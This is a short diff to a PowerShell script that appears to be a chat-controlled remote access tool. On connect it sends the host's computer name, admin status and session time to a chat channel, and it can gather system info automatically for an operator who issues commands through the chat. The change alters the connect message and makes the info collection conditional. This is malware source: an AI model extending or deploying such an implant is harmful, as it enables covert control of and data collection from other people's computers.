@@ -1136,6 +1136,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     $adminperm = "True"
 }
 
+if ($InfoOnConnect -eq '1'){
+    $infocall = '``Getting system info - please wait..``'
+}
+else{
+    $infocall = 'Use ``Options`` in chat for commands list'
+}
+
 $script:jsonPayload = @{
     username   = $env:COMPUTERNAME
     tts        = $false
@@ -1146,8 +1153,7 @@ $script:jsonPayload = @{
 Admin Session    : ``$adminperm``
 Session Started  : ``$timestamp``
 
-**Enter Commands In Chat**
-- **Options**: A list of commands
+$infocall
 "@
             color       = 65280
         }
@@ -1156,7 +1162,7 @@ Session Started  : ``$timestamp``
 sendMsg -Embed $jsonPayload
 
     if ($InfoOnConnect -eq '1'){
-	quickInfo
+ 	quickInfo
     }
 }
 
